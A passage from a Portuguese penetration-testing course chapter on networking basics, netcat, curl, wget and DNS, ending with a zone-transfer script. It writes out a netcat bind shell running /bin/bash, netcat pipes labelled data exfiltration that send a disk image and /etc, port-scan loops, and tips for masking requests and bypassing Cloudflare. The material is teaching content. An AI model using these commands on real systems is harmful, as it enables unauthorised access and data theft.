## Conectividade
Nesse paper será abordado os seguintes tópicos:
- Definição básica de rede
	- IP
	- TCP/UDP
	- Serviços 
	- ICMP
- Comunicação de Rede.
- DNS

### Definição Básica de Rede. 
Bom, estamos todos conectados à Internet. Na Internet todo mundo tem que ter um endereço para que possa acessar e ser acessado outros Hosts na Internet.

#### O que é um IP?
IP é um protocolo que está para Internet Protocol, ele basicamente é um protocolo de endereçamento e opera na camada de rede. Vamos focar apenas no IPv4, possui 32 bits:
![IPv4](https://core0.staticworld.net/images/article/2015/11/ipv4-100629207-orig.png)

O que nós chamamos de octeto é a composição de 8 bits por bloco sendo no total 4 blocos resultando em 32 bits. Conforme a imagem acima pode-se notar que é convertido de decimal para binário. Não entraremos nos detalhes sobre conversão e máscaras de rede etc, o foco não é esse. O que importa é que todos temos um endereço IPv4 público. 

Para você identificar o seu endereço na Internet você pode abrir um site qualquer que informe seu endereço IPv4 mas como estamos lidando com um paper sobre shellscript vamos fazer isso usando o comando curl: 

```
curl meuip.com | egrep "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]"
```
O comando acima utiliza o **curl** e o **egrep** com um pouco de expressão regular. O **curl** irá fazer uma requição web para **meuip.com** e atráves do pipe irá encaminhar para a entrada do comando **egrep** que irá aplicar a expressão regular e trazer todas as ocorrencias do que seria um endereço IPv4. 

Esse é o seu endereço IPv4 na Internet. 
#### Protocolos de Transporte. 
Mais além disso nós temos dois protocolos principais de transporte, o **TCP** e o **UDP**, eles operam de forma diferente e são os responsáveis por ir até o nosso destino. 

- TCP: Opera com estabelecimento de conexão atráces do 3way handshake, trata perda de pacotes e etc.
- UDP: Simplesmente envia, sem estabelecer a conexão antes e tão pouco se importa se o pacote chegou ao destino. 

#### Serviços
Então a partir disso tudo, nós seres humanos acessamos serviços na Internet, por exemplo, um website. Websites geralmente operam em duas portas **80** e **443**, sendo a primeira que não implementa criptografia e a segunda que implementa criptografia usando SSL/TLS. 

Então com isso em mente nós podemos simplesmente nos conectar a esses serviços usando o endereço IP e a Porta. 

Vamos realizar um teste utilizando o netcat. O Netcat é o canivete suiço dos hackers pois permite conexão em portas usando tanto TCP como UDP e outras coisas interessantes. 

A sintaxe do netcat é bem simples:
```
nc <IP> <port> 
```

Então vamos nos conectar ao servidor **meuip.com**:

```
$ echo 'GET / HTTP/1.1/r/n' | nc meuip.com 80
HTTP/1.1 400 Bad Request
Date: Sat, 17 Nov 2018 21:57:20 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.6.38
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>

```
Então é possível lidar com esses serviços diretamente atráves da linha de comando. Existem vários outros serviços, cada porta é um serviço de rede, segue abaixo uma tabela: 
![network ports](https://patentimages.storage.googleapis.com/WO2002061510A2/imgf000036_0001.png)

Você também poderia consultar o arquivo **/etc/services** das duas seguintes formas:
```
$ grep '80/tcp' /etc/services 
http		80/tcp		www		# WorldWideWeb HTTP
socks		1080/tcp			# socks proxy server
http-alt	8080/tcp	webcache	# WWW caching service
amanda		10080/tcp			# amanda backup services
canna		5680/tcp			# cannaserver
``` 
Observe que ele exibe a porta 80/tcp como sendo um serviço HTTP. 

A outra forma seria atráves do **getent** que realiza a busca nessa base: 
```
$ getent services 80
http                  80/tcp www

```

Com isso nós sabemos que a porta 80/TCP geralmente é para serviços de HTTP, isso é um padrão porem não mandatório, o responsável pelo servidor poderia simplesmente colocar qualquer outro serviço na porta 80/tcp porém como falei, se ele colocasse o website na porta 8888, por padrão todo mundo iria tentar acessar a 80/tcp, logo é mais fácil colocar o serviço na porta padrão do que colocar numa outra porta.

#### ICMP
O ICMP é o tal do ping, é um protocolo que opera na camada 3, é um subprotocolo do protocolo IP porém com ele é possível realizar pings em portas, o que nós podemos chamar de protocolo de camada 2.5(dois e meio?, acho que fica bom)

Esse protocolo faz nada mais nada menos que verificar se um host está na rede, vocẽ dispara o ping e se o servidor responder significa que ele está ONLINE, caso ele não responda ele pode estar offline ou ter algum firewall bloqueando o protocolo ICMP. 

Observe:
``` 
$ ping -c 5 192.168.1.2
PING 192.168.1.2 (192.168.1.2) 56(84) bytes of data.
64 bytes from 192.168.1.2: icmp_seq=1 ttl=64 time=1.45 ms
64 bytes from 192.168.1.2: icmp_seq=2 ttl=64 time=1.10 ms
64 bytes from 192.168.1.2: icmp_seq=3 ttl=64 time=1.69 ms
64 bytes from 192.168.1.2: icmp_seq=4 ttl=64 time=1.09 ms
64 bytes from 192.168.1.2: icmp_seq=5 ttl=64 time=1.21 ms

--- 192.168.1.2 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 1.093/1.313/1.696/0.231 ms
```

Foi disparado 5 pacotes para o ip **192.168.1.2** e ele respondeu todos os 5, significa que o host está ativo.

Agora outros programas que utilizam o icmp são:
- mtr
- traceroute/tracepath

Os dois programas tem a ideia de medir a rota até um determinado destino, então eles mapeiam todos os hop's até determinado destino, observe abaixo um exemplo de uso do comando mtr: 
```
$ mtr -n meuip.com -c 10 -r 
Start: 2018-11-17T20:06:43-0200
HOST: remember                    Loss%   Snt   Last   Avg  Best  Wrst StDev
  1.|-- 192.168.1.2                0.0%    10   43.1   8.8   1.1  43.1  14.3
   [ REMOVIDO ]
 21.|-- 54.233.138.36              0.0%    10  360.1 214.3  74.9 419.5 113.6

```

Então nosso pacote passa por aproximadamente 20 hop's antes de alcançar nosso destino. 

Teste o comando traceroute e veja como ele funciona. 

### Comunicação de Rede.
Nesse tópico iremos abordar os seguintes programas:
- Netcat
- Telnet
- Wget
- Curl

#### Netcat
Bom, conforme citado no tópico anterior, o **netcat** é uma ferramenta muito útil pois permite que nós seres humanos conectarmos em hosts pela Internet e até ser conectados.

O netcat opera com TCP e UDP, então dá para empregar ele em vários cenários interessantes. 

Vale ressaltar que existem várias variantes do netcat, Ncat, nc etc. Porém aqui iremos trabalhar com a mantida pelos pacotes do Ubuntu. 
```shell
$ apt show netcat
Package: netcat
Version: 1.10-41.1
Priority: optional
Section: universe/net
Origin: Ubuntu
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Original-Maintainer: Ruben Molina <rmolina@udea.edu.co>
Bugs: https://bugs.launchpad.net/ubuntu/+filebug
Installed-Size: 13,3 kB
Depends: netcat-traditional (>= 1.10-39)
Download-Size: 3.436 B
APT-Sources: http://archive.ubuntu.com/ubuntu bionic/universe amd64 Packages
Description: TCP/IP swiss army knife -- transitional package
 This is a "dummy" package that depends on lenny's default version of
 netcat, to ease upgrades. It may be safely removed.
```


A sintaxe dele é bem simples:
```shell
nc options host IP address port 
```


Mas como assim? Bom é simples, com o netcat e sabendo o IP e Porta que vocẽ queira conectar, você pode interagir diretamente com o serviço. 


Você vai entender na prática: 

##### Requisição Web
Como já sabemos, o protocolo HTTP opera na porta 80, então vamos nos conectar no meu blog por exemplo: 
```
nc diesec.sytes.net 80 
```
Uma vez conectado, você pode notar que nada aconteceu, então digite o seguinte:
```
GET / HTTP/1.1
```

E o servidor irá responder com o seguinte conteúdo:
```html
HTTP/1.1 400 Bad Request
Date: Sat, 01 Dec 2018 17:33:55 GMT
Server: Apache
Vary: accept-language,accept-charset
X-Frame-Options: SAMEORIGIN
Accept-Ranges: bytes
Connection: close
Content-Type: text/html; charset=utf-8
Content-Language: en
Expires: Sat, 01 Dec 2018 17:33:55 GMT

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Bad request!</title>
<link rev="made" href="mailto:4non_47@protonmail.ch" />
<style type="text/css"><!--/*--><![CDATA[/*><!--*/ 
    body { color: #000000; background-color: #FFFFFF; }
    a:link { color: #0000CC; }
    p, address {margin-left: 3em;}
    span {font-size: smaller;}
/*]]>*/--></style>
</head>

<body>
<h1>Bad request!</h1>
<p>


    Your browser (or proxy) sent a request that
    this server could not understand.

</p>
<p>
If you think this is a server error, please contact
the <a href="mailto:4non_47@protonmail.ch">webmaster</a>.

</p>

<h2>Error 400</h2>
<address>
  <a href="/">diesec.sytes.net</a><br />
  <span>Apache</span>
</address>
</body>
</html>

```

Deu erro 400 pois o servidor não entendeu a requisição. Mas nenhum problema até agora, já conseguimos interagir com o serviço HTTP do servidor remoto. 

Agora outro truque é ligar o verbose para que ele informe caso consiga conectar, para fazer isso basta digitar: 

```
nc -evv diesec.sytes.net 80
```
A opção **e** permite que o echo interprete os caracteres de escape e o **v** aumenta o verbose. 

E o comando retorna na primeira linha o seguinte:
```
$ nc -evv diesec.sytes.net 80
Connection to diesec.sytes.net 80 port [tcp/http] succeeded!
```

Ele informa que conseguiu conectar no destino, ótimo.

A falha na requisição está no fato de que existem alguns outros elementos que precisam ser encaminhados na requisição. Para a gente ver como uma requisição é feita com um browser comum, sugiro o seguinte teste: Vamos abrir uma porta no nosso localhost e então fazer o nosso browser fazer uma requisição. 

Primeiro, abra um terminal e digite:
```
nc -tlnvp 4444
```
Agora abra o seu browser e digite na URL:
```
localhost:4444
```
E o resultado da requisição é a seguinte:
```
$ nc -tlnvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 127.0.0.1 35622 received!
GET / HTTP/1.1
Host: localhost:4444
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
``` 


Então toda vez que um browser faz uma requisição web ele encaminha todas essas informações, agora fica mais fácil a gente forjar uma requisição usando o netcat, vamos tentar novamente: 

```
echo -e  'GET / HTTP/1.1\r\nHost: diesec.sytes.net\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n' | nc -tvv diesec.sytes.net 80
```
Aqui foi passado todos os parãmetros para uma requisição válida e ela obtêm sucesso, exibindo toda a index da página. 

Mas nem todos os parâmetros são necessários, apenas definindo o GET e o HOST é possível acessar a página, segue exemplo:
```
echo -e 'GET / HTTP/1.1\r\nHost: diesec.sytes.net\r\n\r\n' | nc diesec.sytes.net 80
```


##### Chat
O Netcat pode ser utilizado para criar um chat, para isso você irá precisar de dois terminais, no primeiro terminal digite o seguinte: 
Primeiro terminal atuará como servidor: 
```
nc -tlnp 4444
```

No segundo terminal que nós iremos chamar de Cliente, execute o seguinte: 

```
nc localhost 4444
```

Então em qualquer um dos terminais se você digitar qualquer coisa e der enter irá aparecer do outro lado! 

Caso você não tenha entendido, quando se abre uma porta usando o netcat, você abre uma porta no seu sistema operacional para conexões de fora, no caso nós abrimos uma porta em todas as interfaces de rede, incluindo a lo(localhost), assim se você se conectar no localhost na porta que você abriu, você vai dentro da aplicação do netcat, simples assim. 

Digite o comando abaixo para verificar as portas abertas ainda com o terminal do servidor do nosso chat aberto: 

```
$ netstat -tlpn | grep 4444
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      16950/nc           

```

Como você pode ver, a porta 4444 está aberta para todas as interfaces, simbolizado pelo **0.0.0.0**. e um pouco mais além é possível ver de quem é o processo, ali informa o PID e o nome, no caso 16950 e o programa é o nc. 

Um outro comando interessante é o **lsof** que vocẽ pode exibir todos os processos com relação à porta 4444, observe:

```
$ lsof -i :4444
COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nc      16950 operador    3u  IPv4 269421      0t0  TCP *:4444 (LISTEN)
nc      16950 operador    4u  IPv4 269422      0t0  TCP localhost:4444->localhost:35842 (ESTABLISHED)
nc      16951 operador    3u  IPv4 269428      0t0  TCP localhost:35842->localhost:4444 (ESTABLISHED)

```

Na saída do comando acima ele me informa que temos 3 processos, um em LISTEN e dois indicando conexão estabelecida. Super COOLL HUN?


##### Abrindo Conexão
Bom, eu falei um pouco sobre abrir conexão no tópico anterior, mas vamos reforçar. 

O netcat pode ser utilizado para receber conexões, a sintaxe é a mesma, como já expliquei o básico no tópico anterior, vou estar ilustrando alguams formas de abrir uma conexão.

Abrindo conexão em todas as interfaces
```
nc -tlnp 4444
``` 
O comando anterior vai abrir a porta 4444 para conexões TCP em todas as interfaces.

Abrindo conexão em interface especifica: 

```
nc -s 192.168.1.113 -tlp 4444

```

Onde **s** determina o endereço IP da interface que você ira dar bind e **tlp** determina um socket tcp, em listen e porta, respectivamente.


##### Scan de Porta
O Netcat pode ser empregado pra realizar portscan. PortScan é uma técnica utilizada para scanear portas e identificar as portas abertas em um servidor remoto ou no próprio servidor(levando em consideração que no próprio servidor existem meios melhores para se determinar isso, tipo pelo netstat, mas em todos os casos, porquẽ não)

Então para fazer isso é simples: 

```shellscript
$ for i in {1..65535};do  [ $(nc -zn 192.168.1.25 $i; echo $? ) == '0' ] && echo "PORT tcp/$i OPEN" ;done
PORT tcp/22 OPEN
PORT tcp/80 OPEN
PORT tcp/111 OPEN
```
A opção **z** indica que é para scanear por daemons sem encaminhar nenhum dado, apenas conectando. 

##### Transmissão de Arquivos/Data Exfiltration
É interessante utilizar o netcat para exfiltrar arquivos, exfiltração é muito utilizado para retirar os dados de um servidor e passar para outro local. Existem várias formas de se realizar isso, seja por conexão direta ou reversa, abaixo segue algumas formas de conexão direta: 

```
# Quem envia 
 dd if=/dev/hdb5 | gzip -9 | nc -l 3333 
 
# Quem Recebe
nc 192.168.0.1 3333 | pv -b > myhdb5partition.img.gz
```

```
# Quem Recebe
 tar -czf - /etc/ | nc -l 3333   
# Quem Envia
 nc 192.168.0.1 3333 | pv -b > mybackup.tar.gz
```

Dependendo do sentido que você estiver fazendo, seja com bind ou reverse shell, o lado que recebe os arquivos precisa encaminhar isso para um arquivo, então  você precisaria redirecionar os dados assim: 

##### BannerGrab
Banner Grab é uma técnica de enumeração/reconhecimento que você detecta qual o serviço que está operando em determinada porta, visando obter a versão do serviço para começar a levantar dados de ataque daquele vetor.

Para fazer isso basta conectar com o netcat na porta especificada e você vai pegar o banner da aplicação, exemplo:

```
# Exemplo A 
$ nc 192.168.1.25 22
SSH-2.0-OpenSSH_7.5p1 Ubuntu-10
# Exemplo B 
$ nc AlgumHost.com  22
SSH-2.0-OpenSSH_7.2
``` 

No exemplo anterior nós conectamos na porta 22 para realizar o banner grabing. Lembre-se de que o banner pode ser adulterado pelo sysadmin responsável. 


##### BindShell
Uma bindshell é quando você se conecta diretamente no alvo. Um exemplo prático é quando você obtem uma webshell por esemplo e abre uma porta nesse servidor e então se conecta nessa porta para executar comandos arbitrários. 

Para realizar tal tarefa, você simplesmente precisa abrir uma porta e direcionar o que chegar nessa porta para o bash por exemplo. 

```
nc -tlnp 4444 -e /bin/bash 
```
A partir disso você se conecta no alvo na porta aberta e poderá executar comandos. 

Existem diversos problemas no emprego do netcat nessa técnica, um deles é que ele perdeu a feature **e** para execução de um programa. Iremos mais além nesse curso falar sobre isso e como contornar a situação. 

##### ReverseShell
Uma reverseShell entra em ação quando existe algum firewall bloqueando o acesos no seu alvo, mesmo vocẽ abrindo uma porta pra realizar a conexão, você não consegue estabelecer pois o firewall vai estar bloqueando a porta que você utilizou. Um truque então é usar uma revershell onde você faz o alvo se conectar ao auditor, no caso à vocẽ. 

Nesse caso, você abre uma porta na sua máquina, e no servidor alvo você conecta na sua máquina na porta aberta. Muitos firewalls deixam isso passar pois só bloqueiam tráfego inbound, não outbound. 


##### Piping e Redirecionamentos
Você já deve ter notado anteriormente a utilização de Pipe **|** para redirecionar saídas para outros arquivos ou até mesmo a entrada. 

Você pode estar utilizando pipes com o netcat da seguinte forma: 
```
nc -vv -z localhost 1-100 > output.txt 2>&1
```

Alguns outros exemplos já foram exibidos em tópicos anteriores, dẽ uma olhada novamente!

#### Telnet
Telnet é um serviço de rede que opera apenas com TCP e por padrão na porta 23, muito utilizado para administração de switchs e roteadores. 

Existe um utilitário no próprio linux chamado de **telnet**, e vocẽ pode estar utilizando para realizar as conexões de telnet. O Netcat pode ser empregado como cliente de telnet. 

#### Wget
Wget é uma ferramenta muito interessante de acesso á paginas web, nós iremos utilizar ela mais além para clonagem de websites.

Atráves do wget você pode fazer requisições web e até mesmo forjar o user-agent, pode ser empregado também para download de qualquer coisa que esteja num webserver além de páginas web claro, por exemplo arquivos. 

A sintaxe é bem simples, segue: 

```
   wget [option]... [URL]...

``` 

Para realizarmos o download da index do meu blog ou qualquer outro site de sua preferência, simplesmente execute:

```
$ wget diesec.sytes.net 
--2018-12-01 17:59:52--  http://diesec.sytes.net/
Resolving diesec.sytes.net (diesec.sytes.net)... 13.58.236.213
Connecting to diesec.sytes.net (diesec.sytes.net)|13.58.236.213|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                                    [  <=>                                                                                 ]  22,00K   103KB/s    in 0,2s    

2018-12-01 17:59:54 (103 KB/s) - ‘index.html’ saved [22533]


```
Vai ser gerado um arquivo **index.html** no mesmo diretório onde o comando foi executado, que no caso é a página requisitada. 

Para direcionar o arquivo requisitado para outro diretório e com outro nome, pode ser utilizado a flag **O**. segue exemplo: 
```
$ wget diesec.sytes.net -O /tmp/index
--2018-12-01 18:01:42--  http://diesec.sytes.net/
Resolving diesec.sytes.net (diesec.sytes.net)... 13.58.236.213
Connecting to diesec.sytes.net (diesec.sytes.net)|13.58.236.213|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘/tmp/index’

/tmp/index                                    [  <=>                                                                                 ]  22,00K   106KB/s    in 0,2s    

2018-12-01 18:01:43 (106 KB/s) - ‘/tmp/index’ saved [22533]
```

#### Curl
O Curl é uma ferramenta muito interessante pois permite realizar requisições web de uma forma simples, podendo ser empregado para realizar ataques de bruteforce em áreas restriritas/administrativas, enumeração de diretório. É uma ferramenta bem interessante pois opera com todos os métodos de requisição WEB(POST/GET/HEAD/OPTIONS ETC), nós iremos abordar ela mais a além na parte de web. 

A sintaxe é muito simples, para utilizar execute: 
```
curl <options> <url> 
```

Exemplo:
```
$ curl diesec.sytes.net
```


Aqui um exemplo de log de um servidor web apache de uma requição efetuada com o CURL: 
```
192.168.25.20 - - [01/Dec/2018:19:05:42 -0200] "GET / HTTP/1.1" 200 22533 "-" "curl/7.58.0"
```

Pode-se notar que o User-Agent é **curl/7.58.0**, o cURL permite que o User-Agent seja alterado na requisição, observe:

```
       -A, --user-agent <name>
              (HTTP)  Specify  the  User-Agent string to send to the HTTP server. To encode blanks in the string, surround the string with single quote marks. This
              can also be set with the -H, --header option of course.

              If this option is used several times, the last one will be used.
```

Então para forjar um User-Agent diferente, vamos fazer da seguinte forma: 

```
curl -A 'Blastoide/6661337' diesec.sytes.net
```

Amostra de log: 
```
10.20.40.24 - - [01/Dec/2018:19:08:32 -0200] "GET / HTTP/1.1" 200 22533 "-" "Blastoide/6661337"
```

Com isso é possível por exemplo criar uma lista de User-Agents conhecidos e usar de forma aleatória visando mascarar as requisições. 

O cURL é uma ferramenta muito interessante e recomendo que você leitor dê uma lida no manual. 

```
man curl
```

O Curl pode ser empregado também caso tudo falhe(nmap/netcat) para realizar scan de portas, vamos supor que não exista nenhum utilitário para que você realize scan de porta num server, você pode recorrer ao cURL da seguinte forma:
```
for var in {1..65535};do curl -s http://hostnamedot.com:$var; done
```

Iremos entrar mais a fundo nessa ferramenta mais além nesse curso. 

### DNS
Nesse tópico iremos abordar os seguintes tópicos:
- O que é DNS 
- Dig
- Host

#### O que é DNS 
DNS significa Domain Name System, é um sistema hierarquico e descentralizado que tem como função nada mais do que resolver dominios para endereços IP. Na Internet tudo opera com IP, não com nomes. Os nomes foram criados para facilitar a vida de nós seres humanos, sem os nomes de dominio teriamos que lembrar os endereços IP de cabeça. Com o IPv4 até dá para memorizar alguns, já no IPv6 eu pago uma cerveja para quem memorizar 6 endereços. 

Então o que que rola, quando nós realizamos uma requisição ou solicitamos qualquer coisa na Internet, nós utilizamos o nome de dominio, antes de enviarmos um pacote ao servidor que estamos solicitando algo ocorre uma resolução de nome, é nessa etapa que entra o DNS, antes de saírmos na Internet nós precisamosa saber o endereço IP do servidor que estamos solicitando, então você basicamente digita google.com no navegador, o navegador primeiro encaminha uma query DNS para um servidor de DNS perguntando qual o endereço IP do google.com e assim obtemos o endereço IP e só então mandamos uma requisição. É mais complexo que isso mas isso é o necessário para o curso.

Mais além iremos entrar mais a fundo em DNS quando abordarmos a construção de tools que envolvam enumeração de hosts de dominios e subdominios de dominios, mas por hora é só.

Em todo servidor/sistema você tem que ter configurado um servidor de DNS para que essa resolução seja possível, caso não exista nenhuma configuração, você provavelmente não vai conseguir resolver nomes logo não vai conseguir acessar nenhum website usando o nome de dominio. 

Em servidores Linux você encontra tais configurações em **/etc/resolv.conf**, geralmente a configuração é feita automaticamente atráves do DHCP da rede que pode apontar pro servidor de DNS interno mas em alguns casos você define quais os servidores de DNS na mão. 

Exemplo do arquivo **/etc/resolv.conf**
```
nameserver 1.1.1.1.1
```

Quando o sistema vai realizar uma consulta de DNS ele primeiro verifica o **/etc/hosts** e depois o **/etc/resolv.conf**. No arquivo **/etc/hosts** você pode por exemplo definir endereços estaticos de nomes, segue um exemplo:

```
127.0.0.1	localhost
127.0.1.1	remember
172.24.4.7	apache
172.24.4.8	bacula
172.24.4.10	docker
172.24.4.16	squid
172.24.4.5	jboss
172.24.4.17	slave
172.24.4.13	master
172.24.4.14	samba
172.24.4.3	nginx
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
É útil caso você tenha máquinas na rede local e não tenha um servidor de DNS interno ou não quer utilizar o hostname das máquinas para configurar, é interessante também para testar VirtualHosts de webservers que estão sendo implementados porém o DNS global ainda não aponta pro servidor novo. Um estudo de caso interessante é que tenho usado pra dar bypass em servidores que estão na CloudFlare, se eu conseguir descobrir o IP do servidor eu adiciono nesse arquivo e então eu vou direto no servidor web que em teoria estaria protegido pela CloudFlare, o que muitos syadmins esquecem é de bloquear tráfego que não seja dos servidores da CloudFlare possibilitando assim o ByPass. 

Não irei entrar em detalhes sobre essa configuração, basta saber que o servidor de DNS que está sendo utilizado é o servidor da cloudflare(1.1.1.1). Caso você queira trocar, basta alterar o IP.

Abaixo segue uma captura de tráfego de uma query DNS: 

O comando executado foi o seguinte:
```
$ dig @9.9.9.9 news.ycombinator.com +short
209.216.230.240
```
Pode-se notar que o endereço IP retornado quando eu solicitei a resolução do **news.ycombinator.com** foi **209.216.230.240**

Agora na amostra de tráfego em si: 
```
$ sudo tcpdump -i any port 53 -nA and host 9.9.9.9
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
19:19:29.911878 IP 192.168.1.113.54295 > 9.9.9.9.53: 37147+ [1au] A? news.ycombinator.com. (61)
E..Y0...@.u....q				...5.E("... .........news.ycombinator.com.......).........
..}...>...
19:19:30.088965 IP 9.9.9.9.53 > 192.168.1.113.54295: 37147 1/0/1 A 209.216.230.240 (65)
E..].p@.8.~.				...q.5...IS..............news.ycombinator.com..............,........)........
^C
```

Repare na seguinte linha:
```
19:19:30.088965 IP 9.9.9.9.53 > 192.168.1.113.54295: 37147 1/0/1 A 209.216.230.240
```

O servidor de DNS retornou que o registro é do tipo A e o valor é **209.216.230.240**

Existem vários tipos de registros de DNS, segue abaixo:
- MX -> Referente à Servidores E-mail
- CNAME -> Referente à nomes canonicos. 
- PTR -> Referente à resolução de IP pra nome, o oposto também é possível.
- A -> Referente apenas ao endereço IPv4
- AAAA -> Referente apenas ao endereço IPv4
- NS -> Referente à servidores autoritativos, servidores de NameServer da zona. 

Iremos entrar em detalhes mais a além no curso.

#### DIG 
O Dig(domain information groper) é uma ferramenta que realiza querys de DNS em servidores de DNS.

Conforme visto no tópico anterior, utilizando o dig é possível realizar resoluções de nome, seja de nome para ip ou o reverso. 

Vamos à sintaxe: 
```
       dig [global-queryopt...] [query...]

```
Então uma consulta default podemos realizar da seguinte forma:
```
$ dig news.ycombinator.com 

; <<>> DiG 9.11.3-1ubuntu1.3-Ubuntu <<>> news.ycombinator.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36248
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;news.ycombinator.com.		IN	A

;; ANSWER SECTION:
news.ycombinator.com.	3	IN	A	209.216.230.240

;; Query time: 142 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Sat Dec 01 19:24:49 -02 2018
;; MSG SIZE  rcvd: 65

```
Para realizar requisições à servidores de DNS especificos: 
```
$ dig @1.1.1.1 news.ycombinator.com

; <<>> DiG 9.11.3-1ubuntu1.3-Ubuntu <<>> @1.1.1.1 news.ycombinator.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8403
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1452
;; QUESTION SECTION:
;news.ycombinator.com.		IN	A

;; ANSWER SECTION:
news.ycombinator.com.	134	IN	A	209.216.230.240

;; Query time: 126 msec
;; SERVER: 1.1.1.1#53(1.1.1.1)
;; WHEN: Sat Dec 01 19:29:46 -02 2018
;; MSG SIZE  rcvd: 65
```

Para diminuir a saída do comando você pode uasr **+short** da seguinte forma:
```
$ dig @1.1.1.1 news.ycombinator.com +short
209.216.230.240

```

Para verificar quais os servidores de NameServer da zona do dominio:
```
$ dig -t ns uol.com +short
eliot.uol.com.br.
charles.uol.com.br.
borges.uol.com.br.
```

Com base nisso, nós podemos por exemplo tentar forçar uma transferência de zona. Uma transferência de zona é o processo de replicação da zona entre o servidor primário e secundário. Geralmente são necessários dois servidores de DNS, um primário e um secundário. O Primário atualiza a zona, notifica o secundário e então o secundário solicita transferência de zona e então a zona é transmitida pro secundário para que ele atualize os registros dele. 

Então com os servidores de NS em mãos, é possível tentar forçar essa transferência de zona, caso ele esteja configurado de forma errônea, toda a zona é vazada para um agente não autorizado. 

Lets try:
```
$ dig @charles.uol.com.br. -t axfr uol.com +short
; Transfer failed.

```
A sintaxe pode ficar um pouco confusa, mas lembrando, para transferir uma zona você precisa usar um servidor que seja responsável pela zona, no caso um dos servidores de NS, então você solicita pra ele, **-t axfr** é a sintaxe que solicita transferência de zona e por ultimo qual o dominio que você quer a transferência. 

Você pode notar que o resultado foi **Transfer Failed** algum sysadmin andou fazendo o dever de casa, é importante então tentar forçar todas os servidores de NS para ver se algum deles a configuração passou batida.


Vamos fazer um programa que faz essa verificação automatiza pa nóis?
###### Exercicio
	Escreva um programa que consulte os servidores de NameServer de determinado Dominio e então tente uma transferência de zona com os servidores NS encontrados. 

###### Solução:
Espero que você tenha feito a atividade propsota, super easy, fiz em menos de 5 minutinhos topster!  Segue código abaixo: 
```
#!/bin/bash
function fail(){
  echo "[*] Nenhuma NS Encontrado para o dominio $DOMAIN, encerrando..."
  exit 1
}
DOMAIN=$1
echo "[+] Iniciando Procedimentos. Alvo -> $DOMAIN"
NS=$(dig -t ns $DOMAIN +short)
[ -n "$NS" ] || fail 
echo "[+] Encontrado $(echo $NS | tr ' ' '\n' | wc -l ) NameServers"
echo "[+] Iniciando tentativa de transferência de zona"
for i in $(echo $NS)
do
  echo -e "\t[-] Testando NameServer $i do dominio $DOMAIN"
  dig @$i -t axfr $DOMAIN +short
done
```
O Script anterior não usou nenhuma mágia negra, apenas utilizou todos os ensinamentos que nós já vimos até aqui.

Caso você não tenha encontrado nenhum NS que tenha transferência de zona habilitado, você pode testar nesse dominio aqui, é um dominio que foi configurado para se praticar transferência de zona: ** zonetransfer.me**
```
$ /bin/bash zonetransfer.sh  zonetransfer.me
[+] Iniciando Procedimentos. Alvo -> zonetransfer.me
[+] Encontrado 2 NameServers
[+] Iniciando tentativa de transferência de zona
	[-] Testando NameServer nsztm2.digi.ninja. do dominio zonetransfer.me
nsztm1.digi.ninja. robin.digi.ninja. 2017103001 172800 900 1209600 3600
"Casio fx-700G" "Windows XP"
"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
0 ASPMX.L.GOOGLE.COM.
10 ALT1.ASPMX.L.GOOGLE.COM.
10 ALT2.ASPMX.L.GOOGLE.COM.
20 ASPMX2.GOOGLEMAIL.COM.
20 ASPMX3.GOOGLEMAIL.COM.
20 ASPMX4.GOOGLEMAIL.COM.
20 ASPMX5.GOOGLEMAIL.COM.
217.147.177.157
nsztm1.digi.ninja.
nsztm2.digi.ninja.
0 0 5060 www.zonetransfer.me.
www.zonetransfer.me.
